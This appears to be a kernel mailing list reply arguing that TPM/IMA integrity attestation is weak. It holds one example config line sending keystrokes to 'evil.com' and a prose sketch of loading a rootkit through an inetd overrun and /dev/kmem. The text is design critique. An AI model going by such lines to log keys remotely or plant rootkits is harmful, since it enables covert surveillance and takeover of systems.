To make this usefull, you need to:
* have TPM chip
* modify all the interpreters
* modify all the programs that security-relevant config files. I.e. if
	there's /etc/keylogger.conf with default
	# No keyboard logging enabled
	and attacker changes it to
	do_log_keys_to_remote evil.com
	... you need that config file to be hashed.
* remove all the buffer overflows. I.e. if grub contains buffer
	overflow in parsing menu.conf... that is not a security hole
	(as of now) because only administrator can modify menu.conf.
	With IMA enabled, it would make your certification useless...
[probably something more].
...seems to me you need to do quite a lot of work to make this
usefull...
[And now, remote-buffer-overrun in inetd probably breaks your
attestation, no? I'll just load my evil code over the network, without
changing any on-disk executables, then install my evil rootkit into
kernel by writing into /dev/kmem. How do you prevent that one?]
